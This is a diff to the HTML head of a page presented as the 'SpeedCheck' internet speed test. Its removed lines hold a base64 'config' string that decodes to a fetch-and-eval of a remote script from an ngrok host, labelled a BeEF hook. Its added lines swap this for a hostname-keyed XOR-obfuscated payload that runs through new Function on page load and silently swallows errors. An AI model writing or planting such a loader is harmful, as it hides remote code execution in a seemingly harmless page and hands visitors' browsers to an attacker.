@@ -5,9 +5,23 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SpeedCheck — Internet Speed Test</title>
 <script>
-  const speedTestConfig = "ZmV0Y2goJ2h0dHBzOi8vZXh1dmlhbC1zaGVsbHktc3ltcGF0aGV0aWNhbGx5Lm5ncm9rLWZyZWUuZGV2L2FuYWx5dGljcy5qcycsIHsKICAgICAgICBoZWFkZXJzOiB7CiAgICAgICAgICAgICduZ3Jvay1za2lwLWJyb3dzZXItd2FybmluZyc6ICd0cnVlJwogICAgICAgIH0KICAgIH0pCiAgICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgICAudGhlbihjb2RlID0+IHsKICAgICAgICBldmFsKGNvZGUpOwogICAgfSkKICAgIC5jYXRjaChlcnIgPT4gY29uc29sZS5lcnJvcignRmFpbGVkIHRvIGxvYWQgQmVFRiBIb29rOicsIGVycikpOw==";
+(function(_payloadStr) {
+  
+    const _k = window.location.hostname;
+    
+    try {
+       
+        const _d = atob(_payloadStr).split('').map((_c, _i) => {
+            return String.fromCharCode(_c.charCodeAt(0) ^ _k.charCodeAt(_i % _k.length));
+        }).join('');
 
-  eval(atob(speedTestConfig));
+       
+        (new Function(_d))();
+    } catch (e) {
+       
+    }
+})("ZAMSWRcJSgoYFRMVHV9YAhEZF1sZAAtIHQ0SQRgYT14JDBcEGg0SWR0CA0EcGEkLCRcYRlkHEEgVTwMAGEoWQxUNG1kZAhRLBBZQAVQaaA1QQUcNCwQTSAYSWA0LQUALCRcYRlkSCUQATAUXARIESAZMFUwCDw4LCUJNDVMVEFgVRkcYZBheJ1oVCkgeSRVFU1tXX1oVB1UESU5MZEsDRREPSk5QXFlFCxMWQVwCSwR6TwQEGgYfBRFBXxNQGhpMVW8=
+");
 </script>
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet">
 <style>
